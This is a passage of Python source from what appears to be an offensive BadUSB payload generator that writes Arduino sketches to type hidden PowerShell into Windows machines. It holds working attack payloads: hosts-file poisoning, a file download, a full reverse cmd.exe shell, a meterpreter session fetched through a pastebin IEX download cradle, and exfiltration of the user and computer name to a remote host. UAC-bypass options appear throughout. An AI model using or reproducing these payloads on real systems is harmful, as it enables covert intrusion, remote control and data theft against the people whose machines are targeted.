    print("*  Options are: 1. Domain Name 2. IP Address 3. How to bypass UAC 5. The output File name  *")
    print("*                                                                                          *")
    print("********************************************************************************************")
    print("\n")
  
    menu = {}
    menu['0'] = "Info"
    menu['1'] = "Set the name of the DNS entry"
    menu['2'] = "Set the IP of the DNS entry"
    menu['3'] = "Set bypassUAC mode"
    menu['4'] = "Set Arduino sketch filename"
    menu['5'] = "Set notification bubble option"
    menu['6'] = "Write Arduino sketch"
    menu['42']= "Return to previous menu"
    menu['99']= "Exit"

    options=menu.keys()
    #options.sort(key=int)
    #for entry in options: 
    for entry in sorted(options):
      print(entry, menu[entry])

    print("\n\n")
    if DNS != "":
      print("The DNS entry is set to ->  " + DNS)
    if remoteIP != "":
      print("The IP of DNS entry is set to ->  " + remoteIP)
    if bypassUACoption != "":
      print("bypassUAC technique set to ->  " + bypassUACoption)
    if bubbleSetting != "":
      print("Notification bubble set to -> " + bubbleSetting)
    if fileName != "":
      print("Arduino filename set to ->  " + fileName)
    
    selection=input("\nPlease Select: ") 

    if selection =='1': 
      DNS = input("Please enter the DNS name of the entry you wish to add: ")
    elif selection == '2':
	    remoteIP = input("Please enter the IP address of the entry you wish to add:  ")
    elif selection == '3': 
      bypassUACoption,bypassUAC = checkUACBypass()
    elif selection == '4':
      fileName = coreUtils.getFileName('changeDNS.ino')
    elif selection == '5':
      bubble, bubbleSetting = notificationBubble()
    elif selection == '6':
      if done == False:
        print("\nYou have not set all the options")
        input("Press Enter to return to the menu and set all the options")
      else:
        looper = True
    elif selection == '42': 
      coreUtils.clearScreen()	
      break
    elif selection == '99':
      exit()
    elif selection == '0':
      nfoCore.Win7info()
    else: 
      print("\n\n***That is not a valid option!***\n\n")
      
    if DNS != "" and remoteIP != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
      done = True
    
  if done == True and looper == True:  

    payload = "void addDNS(){\n"
    payload += "  Keyboard.println(\"powershell -w hidden  \\\"ac -Path 'C:\\\\WINDOWS\\\\system32\\\\drivers\\\\etc\\\\hosts' -Value '" + remoteIP + "     " + DNS + "';\\\"\");\n"
    payload += "  pressEnter();\n"
    if bypassUACoption == "run As (visible popup)":
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"
    elif bypassUACoption == "None":
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"     
    payload += "}\n"

    payloadFunc = "addDNS();\n"

    WinWriteFile(fileName,payloadFunc,bypassUAC,payload,bubble) 
  
def WinOption8():

  done = False
  looper = False
  URL=""
  dropFile=""
  fileName=""
  bypassUACoption=""
  bubbleSetting=""

  while looper != True:

    coreUtils.clearScreen()
    print("********************************************************************************************")
    print("*                                                                                          *")
    print("*                              Download File to Desktop                                    *")
    print("*          This payload will download a file and copy it to the user's desktop             *")
    print("*               Options are: 1. Full URL to file to download 2. File Name                  *")
    print("*                                                                                          *")
    print("********************************************************************************************")
    print("\n")
  
    menu = {}
    menu['0'] = "Info"
    menu['1'] = "Set URL of the file to download to the Desktop"
    menu['2'] = "Set bypassUAC mode"
    menu['3'] = "Set Arduino sketch filename"
    menu['4'] = "Set notification bubble option"
    menu['5'] = "Write Arduino sketch"
    menu['42']= "Return to previous menu"
    menu['99']= "Exit"

    options=menu.keys()
    #options.sort(key=int)
    #for entry in options: 
    for entry in sorted(options):
      print(entry, menu[entry])

    print("\n\n")
    if URL != "":
      print("Full URL to file set to ->  " + URL)
    if dropFile !="":
	    print("Name of file being dropped onto Desktop ->  " + dropFile)
    if bypassUACoption != "":
      print("bypassUAC technique set to ->  " + bypassUACoption)
    if bubbleSetting != "":
      print("Notification bubble set to -> " + bubbleSetting)
    if fileName != "":
      print("Arduino filename set to ->  " + fileName)
    
    selection=input("\nPlease Select: ") 

    if selection =='1': 
      URL = input("Please enter the full URL of the file (please include \"http://\" or \"https://\"): ")
      dropFile = coreUtils.getBinary(URL)
    elif selection == '2': 
      bypassUACoption,bypassUAC = checkUACBypass()
    elif selection == '3':
      fileName = coreUtils.getFileName('desktopFile.ino')
    elif selection == '4':
      bubble, bubbleSetting = notificationBubble()
    elif selection == '5':
      if done == False:
        print("\nYou have not set all the options")
        input("Press Enter to return to the menu and set all the options")
      else:
        looper = True
    elif selection == '42': 
      coreUtils.clearScreen()	
      break
    elif selection == '99':
      exit()
    elif selection == '0':
      nfoCore.Win8info()
    else: 
      print("\n\n***That is not a valid option!***\n\n")
      
    if URL != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
      done = True
    
  if done == True and looper == True:  
    payload = "void Download(){\n"
    payload += "  Keyboard.println(\"powershell -w hidden \\\"$url = '"+URL+ "';$output = 'C:\\\\users\\\\'+$env:Username+'\\\\Desktop\\\\"+dropFile+"';Invoke-Webrequest -Uri $url -OutFile $output;exit;\\\"\");\n"
    payload += "  pressEnter();\n"
    if bypassUACoption == "run As (visible popup)":
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"
    elif bypassUACoption == "None":
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"     
    payload += "}\n"

    payloadFunc = "Download();\n"

    WinWriteFile(fileName,payloadFunc,bypassUAC, payload,bubble)  

def WinOption9():

  done = False
  looper = False
  remoteIP=""
  remotePort=""
  fileName=""
  bypassUACoption=""
  bubbleSetting=""
  
  while looper != True:
  
    coreUtils.clearScreen()
    print("********************************************************************************************")
    print("*                                                                                          *")
    print("*                               Reverse TCP CMD Prompt                                     *")
    print("*                 This payload will create a Reverse TCP CMD Prompt                        *")
    print("*          Options are: 1. IP Address 2. Listening Port 3. The output File name            *")
    print("*                                                                                          *")
    print("********************************************************************************************")
    print("\n")

    menu = {}
    menu['0'] = "Info"
    menu['1'] = "Set IP address of the remote server"
    menu['2'] = "Set the listening port of the remote server"
    menu['3'] = "Set bypassUAC mode"
    menu['4'] = "Set Arduino sketch filename"
    menu['5'] = "Set notification bubble option"
    menu['6'] = "Write Arduino sketch"
    menu['42']= "Return to previous menu"
    menu['99']= "Exit"

    options=menu.keys()
    #options.sort(key=int)
    #for entry in options: 
    for entry in sorted(options):
      print(entry, menu[entry])

    print("\n\n")
    if remoteIP != "":
      print("IP of the remote server set to ->  " + remoteIP)
    if remotePort != "":
	    print("Listening port on the remote server set to ->  " + remotePort)
    if bypassUACoption != "":
      print("bypassUAC technique set to ->  " + bypassUACoption)
    if bubbleSetting != "":
      print("Notification bubble set to -> " + bubbleSetting)
    if fileName != "":
      print("Arduino filename set to ->  " + fileName)
    
    selection=input("\nPlease Select: ") 

    if selection =='1': 
      remoteIP = input("Please enter the IP address of the remote server to connect to: ")
    elif selection == '2':
      remotePort = input("Please enter the listening port on the remote server: ")	
    elif selection == '3': 
      bypassUACoption,bypassUAC = checkUACBypass()
    elif selection == '4':
      fileName = coreUtils.getFileName('reverseCMD.ino')
    elif selection == '5':
      bubble, bubbleSetting = notificationBubble()
    elif selection == '6':
      if done == False:
        print("\nYou have not set all the options")
        input("Press Enter to return to the menu and set all the options")
      else:
        looper = True
    elif selection == '42': 
      coreUtils.clearScreen()	
      break
    elif selection == '99':
      exit()
    elif selection == '0':
      nfoCore.Win9info()
    else: 
      print("\n\n***That is not a valid option!***\n\n") 
      
    if remoteIP != "" and remotePort != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
      done = True
    
  if done == True and looper == True:  
    payload = "void reverseCMD(){\n"
    if bypassUACoption == "https://goo.gl/fPl4tm (no visible popup)":
      payload +="Keyboard.println(\"RSC{if ($c.Connected -eq $true) {$c.Close()};if ($p.ExitCode -ne $null) {$p.Close()};"
    else:
      payload +="Keyboard.println(\"powershell -w hidden -nop -c function \\\"RSC{if ($c.Connected -eq $true) {$c.Close()};if ($p.ExitCode -ne $null) {$p.Close()};"
    payload +="exit;};$a='"+remoteIP+"';$p='"+remotePort+"';$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$p);$s=$c.GetStream();"
    payload +="$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';"
    payload +="$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;"
    payload +="$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){$o += $e.GetString($os.Read())};"
    payload +="$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;while (-not $d) {if ($c.Connected -ne $true) {RSC};$pos=0;$i=1;"
    payload +="  while (($i -gt 0) -and ($pos -lt $nb.Length)) {$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;if (-not $pos -or $pos -eq 0) {RSC};"
    payload +="if ($nb[0..$($pos-1)] -contains 10) {break}};if ($pos -gt 0){$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;"
    payload +="if ($p.ExitCode -ne $null){RSC}else{$o=$e.GetString($os.Read());while($os.Peek() -ne -1){$o += $e.GetString($os.Read());"
    if bypassUACoption == "https://goo.gl/fPl4tm (no visible popup)":
      payload +="if ($o -eq $str) {$o=''}};$s.Write($e.GetBytes($o),0,$o.length);$o=$null;$str=$null}}else{RSC}};\");\n"
    else:
      payload +="if ($o -eq $str) {$o=''}};$s.Write($e.GetBytes($o),0,$o.length);$o=$null;$str=$null}}else{RSC}};\\\"\");\n"
    payload +="pressEnter();\n"
    if bypassUACoption == "run As (visible popup)":
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"
    elif bypassUACoption == "None":
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"     
    payload += "}\n"
    
    payloadFunc = "reverseCMD();\n"

    WinWriteFile(fileName,payloadFunc,bypassUAC, payload,bubble)

def WinOption10():

  done = False
  looper = False
  pastebinKey = False
  remoteIP= ""
  remotePort= ""
  fileName=""
  RCfile=""
  bypassUACoption=""
  bubbleSetting=""

  while looper != True:

    coreUtils.clearScreen()
    print("******************************************************************************************************")
    print("*                                                                                                    *")
    print("*                         windows/meterpreter/reverse_https                                          *")
    print("*            This payload will create a Reverse HTTPS meterpreter session                            *")
    print("*   Options are: 1. IP Address 2. Listening Port 3. The output File name 4. direct or via pastebin   *")
    print("*                                                                                                    *")
    print("******************************************************************************************************")
    print("\n")
  
    menu = {}
    menu['0'] = "Info"
    menu['1'] = "Set IP address of the remote server"
    menu['2'] = "Set the listening port of the remote server"
    menu['3'] = "Set the filename of the Metasploit RC File"
    menu['4'] = "Set bypassUAC mode"
    menu['5'] = "Set Arduino sketch filename"
    menu['6'] = "Set notification bubble option"
    menu['7'] = "Put payload to pastebin"
    menu['8'] = "Write Arduino sketch"
    menu['42']= "Return to previous menu"
    menu['99']= "Exit"

    options=menu.keys()
    #options.sort(key=int)
    #for entry in options: 
    for entry in sorted(options):
      print(entry, menu[entry])

    print("\n\n")
    if remoteIP != "":
      print("IP of the remote server set to ->  " + remoteIP)
    if remotePort != "":
      print("Listening port on the remote server set to ->  " + remotePort)
    if RCfile != "":
      print("Metasploit RC File name set to ->  " + RCfile)
    if bypassUACoption != "":
      print("bypassUAC technique set to ->  " + bypassUACoption)
    if bubbleSetting != "":
      print("Notification bubble set to -> " + bubbleSetting)
    if fileName != "":
      print("Arduino filename set to ->  " + fileName)
    if pastebinKey:
        print("Upload payload to pastebin -> Enabled (key: %s)" % pastebinKey)

    selection=input("\nPlease Select: ") 

    if selection =='1': 
      remoteIP = input("Please enter the IP address of the remote server to connect to: ")
    elif selection == '2':
      remotePort = input("Please enter the listening port on the remote server: ")	
    elif selection == '3':
      RCfile = coreUtils.getRCFileName('revMetPSH.rc')
    elif selection == '4': 
      bypassUACoption,bypassUAC = checkUACBypass()
    elif selection == '5':
      fileName = coreUtils.getFileName('revMetPSH.ino')
    elif selection == '6':
      bubble, bubbleSetting = notificationBubble()
    elif selection == '7':
      if not pastebinKey:
        pastebinKey = input("Please enter your pastebin API key: ")
      else:
        pastebinKey = False
    elif selection == '8':
      if done == False:
        print("\nYou have not set all the options")
        input("Press Enter to return to the menu and set all the options")
      else:
        looper = True
    elif selection == '42': 
      coreUtils.clearScreen()	
      break
    elif selection == '99':
      exit()
    elif selection == '0':
      nfoCore.Win10info()
    else: 
      print("\n\n***That is not a valid option!***\n\n")
      
    if remoteIP != "" and remotePort != "" and fileName != "" and RCfile != "" and bypassUACoption != "" and bubbleSetting != "":
      done = True
    
  if done == True and looper == True:  

    payload = "void reversePSH(){\n"
    payload += "  Keyboard.println(\""

    if pastebinKey:
        rpayload = '''
        put here your ps1 dropper
        '''
        pastebinUrl = uploadToPastebin(pastebinKey,rpayload)
        payload +=  "powershell -ep bypass -noni -nop -w hidden -c \\\"IEX (New-Object Net.WebClient).DownloadString('"+pastebinUrl+"')\\\""
    else:
        payload += "powershell -w hidden -nop -c function RSC{if ($c.Connected -eq $true) {$c.Close()};"
        payload += "if ($p.ExitCode -ne $null) {$p.Close()};exit;};$a='"+remoteIP+"';$p='"+remotePort+"';$c=New-Object system.net.sockets.tcpclient;"
        payload += "$c.connect($a,$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process;"
        payload += "$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;"
        payload += "$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){$o += $e.GetString($os.Read())};"
        payload += "$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;while (-not $d) {if ($c.Connected -ne $true) {RSC};$pos=0;$i=1; "
        payload += "while (($i -gt 0) -and ($pos -lt $nb.Length)) {$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;if (-not $pos -or $pos -eq 0) {RSC};if ($nb[0..$($pos-1)] -contains 10) {break}};"
        payload += "if ($pos -gt 0){$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if ($p.ExitCode -ne $null){RSC}else{$o=$e.GetString($os.Read());"
        payload += "while($os.Peek() -ne -1){$o += $e.GetString($os.Read());if ($o -eq $str) {$o=''}};$s.Write($e.GetBytes($o),0,$o.length);$o=$null;$str=$null}}else{RSC}};"


    payload += "\");\n"
    payload += "  pressEnter();\n"
    if bypassUACoption == "run As (visible popup)":
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"
    elif bypassUACoption == "None":
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"     
    payload += "}\n"

    payloadFunc = "reversePSH();\n"

    coreUtils.msfRCfile(remoteIP,remotePort,'windows/meterpreter/reverse_https',RCfile)
    WinWriteFile(fileName,payloadFunc,bypassUAC, payload,bubble)

    
def WinOption11():

  done = False
  looper = False
  remoteIP=""
  remotePort=""
  fileName=""
  bypassUACoption=""
  bubbleSetting=""

  while looper != True:
  
    coreUtils.clearScreen()
    print("********************************************************************************************")
    print("*                                                                                          *")
    print("*                             UserName and Computer Name                                   *")
    print("*  This payload will grab the UserName and Computer Name of the who plugged in the device  *")
    print("*                     Options are: 1. remote IP 2. Listening Port                          *")
    print("*                                                                                          *")
    print("*                                                                                          *")
    print("********************************************************************************************")
    print("\n")

    menu = {}
    menu['0'] = "Info"
    menu['1'] = "Set the IP of the remote server"
    menu['2'] = "Set the listening port of the remote server"
    menu['3'] = "Set bypassUAC mode"
    menu['4'] = "Set Arduino sketch filename"
    menu['5'] = "Set notification bubble option"
    menu['6'] = "Write Arduino sketch"
    menu['42']= "Return to previous menu"
    menu['99']= "Exit"

    options=menu.keys()
    #options.sort(key=int)
    #for entry in options: 
    for entry in sorted(options):
      print(entry, menu[entry])

    print("\n\n")
    if remoteIP != "":
      print("The IP of the remote server is set to ->  " + remoteIP)
    if remotePort != "":
      print("The listening port of the remote server is set to ->  " + remotePort)
    if bypassUACoption != "":
      print("bypassUAC technique set to ->  " + bypassUACoption)
    if bubbleSetting != "":
      print("Notification bubble set to -> " + bubbleSetting)
    if fileName != "":
      print("Arduino filename set to ->  " + fileName)
    
    selection=input("\nPlease Select: ") 

    if selection == '1':
      remoteIP = input("Please enter the IP of the server to send the data to: ")
    elif selection == '2':
      remotePort = input("Please enter the port the server will be listening on: ")
    elif selection == '3': 
      bypassUACoption,bypassUAC = checkUACBypass()
    elif selection == '4':
      fileName = coreUtils.getFileName('userAndComputer.ino')
    elif selection == '5':
      bubble, bubbleSetting = notificationBubble()
    elif selection == '6':
      if done == False:
        print("\nYou have not set all the options")
        input("Press Enter to return to the menu and set all the options")
      else:
        looper = True
    elif selection == '42': 
      coreUtils.clearScreen()	
      break
    elif selection == '99':
      exit()
    elif selection == '0':
      nfoCore.Win11info()
    else: 
      print("\n\n***That is not a valid option!***\n\n")
      
    if remoteIP != "" and remotePort != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
      done = True
    
  if done == True and looper == True:  
    payload = "void userAndComputer(){\n"
    if bypassUACoption == "https://goo.gl/fPl4tm (no visible popup)":
      payload += "  Keyboard.print(\"$pc = $env:computername;$user = $env:UserName; $Message = $pc + '     ' + $user; $port=" + remotePort +"; $remoteHost=\'"+ remoteIP 
    else:    
      payload += "  Keyboard.print(\"powershell -w Hidden \\\"$pc = $env:computername;$user = $env:UserName; $Message = $pc + '     ' + $user; $port=" + remotePort +"; $remoteHost=\'"+ remoteIP 
    payload += "\'; $socket = new-object System.Net.Sockets.TcpClient($remoteHost, $port); $data = [System.Text.Encoding]::ASCII.GetBytes($Message);"
    if bypassUACoption == "https://goo.gl/fPl4tm (no visible popup)":
      payload += " $stream = $socket.GetStream(); $stream.Write($data,0,$data.Length);exit;\");\n"
    else:
      payload += " $stream = $socket.GetStream(); $stream.Write($data,0,$data.Length);exit;\\\"\");\n"
    payload += "  pressEnter();\n"
    if bypassUACoption == "run As (visible popup)":
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"
    elif bypassUACoption == "None":
      payload += "  Keyboard.println(\"exit\");\n"
      payload += "  delay(100);\n"
      payload += "  pressEnter();\n"     
    payload += "}\n"

    payloadFunc = "userAndComputer();\n"

    WinWriteFile(fileName,payloadFunc,bypassUAC,payload,bubble)

def WinOption12():

  done = False
  looper = False
  customCMD = ""
  fileName=""
  bypassUACoption=""
  bubbleSetting=""

  while looper != True:
  
    coreUtils.clearScreen()
    print("********************************************************************************************")
    print("*                                                                                          *")
    print("*                             Custom Command Prompt Payload                                *")
    print("*              This payload will execute a custom command prompt payload                   *")
    print("*                   Options are: 1. CMD code 2. The output File name                       *")
    print("*                                                                                          *")
    print("*                                                                                          *")
    print("********************************************************************************************")
    print("\n")

    menu = {}
    menu['0'] = "Info"
    menu['1'] = "Set Command Prompt payload to execute"
    menu['2'] = "Set bypassUAC mode"
    menu['3'] = "Set Arduino sketch filename"
    menu['4'] = "Set notification bubble option"
    menu['5'] = "Write Arduino sketch"
    menu['6'] = "Display Command Prompt payload"
    menu['42']= "Return to previous menu"
    menu['99']= "Exit"

    options=menu.keys()
    #options.sort(key=int)
    #for entry in options: 
    for entry in sorted(options):
      print(entry, menu[entry])

    print("\n\n")
    if customCMD != "":
      print("Command Prompt payload is set")
    if bypassUACoption != "":
      print("bypassUAC technique set to ->  " + bypassUACoption)
    if bubbleSetting != "":
      print("Notification bubble set to -> " + bubbleSetting)
    if fileName != "":
      print("Arduino filename set to ->  " + fileName)
    
    selection=input("\nPlease Select: ")

    if selection =='1': 
      customCMD = input("Please input your custom CMD payload : ")
    elif selection == '2': 
      bypassUACoption,bypassUAC = checkUACBypass()
    elif selection == '3':
      fileName = coreUtils.getFileName('customCMD.ino')
    elif selection == '4':
      bubble, bubbleSetting = notificationBubble()
    elif selection == '5':
      if done == False:
        print("\nYou have not set all the options")
        input("Press Enter to return to the menu and set all the options")
      else:
        looper = True
    elif selection == '6':
      if customCMD == "":
        print("you have not entered a custom CMD payload yet")
        input("Please press enter to continue")
        coreUtils.clearScreen()
      else:
        print("Custom CMD payload set as -> " + customCMD)
        input("Please press enter to continue")
    elif selection == '42': 
      coreUtils.clearScreen()   
      break
    elif selection == '99':
      exit()
    elif selection == '0':
      nfoCore.Win12info()
    else: 
      print("\n\n***That is not a valid option!***\n\n")
      
    if customCMD != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
      done = True
  
  if done == True and looper == True:
    customCMD = coreUtils.addEscape(customCMD)
    payload = "void customCMD(){\n"
    payload += "Keyboard.println(\"" + customCMD + "\");\n"
    payload += "  delay(100);\n"
    payload += "  pressEnter();\n"
    payload += "  Keyboard.println(\"exit\");\n"
    payload += "  delay(100);\n"
    payload += "  pressEnter();\n"
    payload += "}\n"

    payloadFunc = "customCMD();\n"


    WinWriteFile(fileName, payloadFunc,bypassUAC,payload,bubble) 
